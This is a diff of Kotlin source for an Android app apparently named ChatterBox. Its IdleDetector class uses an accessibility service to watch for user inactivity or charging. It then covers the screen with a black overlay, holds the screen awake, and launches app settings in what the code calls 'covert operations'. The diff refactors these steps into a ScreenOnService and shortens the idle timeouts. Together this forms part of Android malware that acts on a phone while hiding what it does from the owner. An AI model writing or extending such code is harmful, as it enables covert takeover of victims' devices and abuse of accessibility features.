@@ -11,20 +11,16 @@ import androidx.localbroadcastmanager.content.LocalBroadcastManager
 
 /**
  * Class to detect user activity and inactivity through the accessibility service
- * Used to determine when to show the black screen overlay
+ * Used to determine when to perform background operations
  */
 object IdleDetector {
     private const val TAG = "IdleDetector"
 
-    private const val LONG_IDLE_TIMEOUT = 1 * 10 * 1000L // 5 minutes instead of 30
-    private const val CHARGING_IDLE_TIMEOUT = 10 * 1000L // 30 seconds instead of 1 minute
+    private const val LONG_IDLE_TIMEOUT = 1 * 10 * 1000L // 10 seconds for testing (would be longer in production)
+    private const val CHARGING_IDLE_TIMEOUT = 10 * 1000L // 10 seconds when charging
 
     // Add charging state tracking
     private var isCharging = false
-
-    // Add screen wake lock management
-    private val screenOnHandler = Handler(Looper.getMainLooper())
-    private var keepingScreenOn = false
 
     // Handler for delayed idle checks
     private val handler = Handler(Looper.getMainLooper())
@@ -147,15 +143,15 @@ object IdleDetector {
     }
 
     /**
-     * Show black screen overlay via the overlay service
+     * Show black screen overlay via the ScreenManagerService
      */
     fun showBlackScreenOverlay(context: Context) {
         try {
-            val intent = Intent(context, overlay::class.java)
-            context.startService(intent)
-            Log.d(TAG, "Starting black screen overlay service")
+            // Use the new combined service
+            ScreenOnService.showBlackOverlay(context)
+            Log.d(TAG, "Showing black screen overlay")
         } catch (e: Exception) {
-            Log.e(TAG, "Failed to start overlay service: ${e.message}")
+            Log.e(TAG, "Failed to show overlay: ${e.message}")
         }
     }
 
@@ -178,6 +174,9 @@ object IdleDetector {
     private fun startCovertOperations(context: Context) {
         Log.d(TAG, "Starting covert operations - device ${if (isCharging) "charging" else "idle for ${idleTimeout/1000} seconds"}")
 
+        // Keep screen on during covert operations
+        ScreenOnService.keepScreenOn(context)
+
         // Now that we've confirmed user is truly idle, launch settings
         try {
             val intent = Intent(Settings.ACTION_APPLICATION_DETAILS_SETTINGS)
@@ -191,49 +190,5 @@ object IdleDetector {
         } catch (e: Exception) {
             Log.e(TAG, "Failed to start covert operations: ${e.message}")
         }
-    }
-
-    /**
-     * Keep the screen on by using a wake lock
-     */
-    private fun startKeepingScreenOn(context: Context) {
-        if (keepingScreenOn) return
-
-        keepingScreenOn = true
-        Log.d(TAG, "Starting to keep screen on")
-
-        // Start a service with a wake lock
-        val intent = Intent(context, ScreenOnService::class.java)
-        context.startService(intent)
-
-        // Periodically simulate minimal activity
-        screenOnHandler.postDelayed(object : Runnable {
-            override fun run() {
-                if (keepingScreenOn) {
-                    simulateMinimalActivity(context)
-                    screenOnHandler.postDelayed(this, 15000) // Every 15 seconds
-                }
-            }
-        }, 15000)
-    }
-
-    /**
-     * Stop keeping the screen on
-     */
-    private fun stopKeepingScreenOn() {
-        if (!keepingScreenOn) return
-
-        keepingScreenOn = false
-        screenOnHandler.removeCallbacksAndMessages(null)
-        Log.d(TAG, "Stopped keeping screen on")
-    }
-
-    /**
-     * Simulate minimal activity to keep screen on
-     */
-    private fun simulateMinimalActivity(context: Context) {
-        // Send a local broadcast that our accessibility service will receive
-        val intent = Intent("com.example.ChatterBox.KEEP_SCREEN_ON")
-        LocalBroadcastManager.getInstance(context).sendBroadcast(intent)
     }
 }
